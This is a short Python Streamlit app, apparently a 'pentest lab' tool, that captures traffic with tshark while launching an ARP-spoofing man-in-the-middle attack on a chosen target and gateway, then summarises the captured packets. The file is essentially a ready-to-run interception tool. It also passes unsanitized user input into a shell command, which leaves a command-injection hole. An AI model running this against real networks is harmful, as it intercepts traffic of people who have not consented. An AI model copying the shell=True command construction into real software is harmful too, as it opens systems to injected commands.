import streamlit as st
import subprocess
import time
import os

def iniciar_captura(interface, arquivo_pcap):
    return subprocess.Popen(["tshark", "-i", interface, "-w", arquivo_pcap])

def parar_captura(process):
    process.terminate()

def executar_arp_spoof(target_ip, gateway_ip, interface):
    comando = f"xterm -e arpspoof -i {interface} -t {target_ip} {gateway_ip}"
    subprocess.Popen(comando, shell=True)

def analisar_pcap(arquivo_pcap):
    try:
        import pyshark
        cap = pyshark.FileCapture(arquivo_pcap)
        pacotes = [pkt.summary_line for pkt in cap[:20]]
        cap.close()
        return pacotes
    except Exception as e:
        return [f"Erro na análise: {e}"]

st.title("CyberSec Lab - Framework Automatizado de Pentest")

st.sidebar.header("Configuração do Ataque")
interface = st.sidebar.text_input("Interface de rede", "eth0")
target_ip = st.sidebar.text_input("IP da máquina alvo", "192.168.0.5")
gateway_ip = st.sidebar.text_input("IP do gateway", "192.168.0.1")
arquivo_pcap = "captura_ataque.pcap"

if st.sidebar.button("Executar ARP Spoofing"):
    st.write("Iniciando captura...")
    captura_process = iniciar_captura(interface, arquivo_pcap)
    time.sleep(3)
    st.write("Executando ataque...")
    executar_arp_spoof(target_ip, gateway_ip, interface)
    st.success("Ataque em execução. Finalize manualmente e clique para análise.")

if st.button("Analisar Captura"):
    st.write("Analisando pacotes capturados...")
    resultados = analisar_pcap(arquivo_pcap)
    st.code("\n".join(resultados), language="bash")
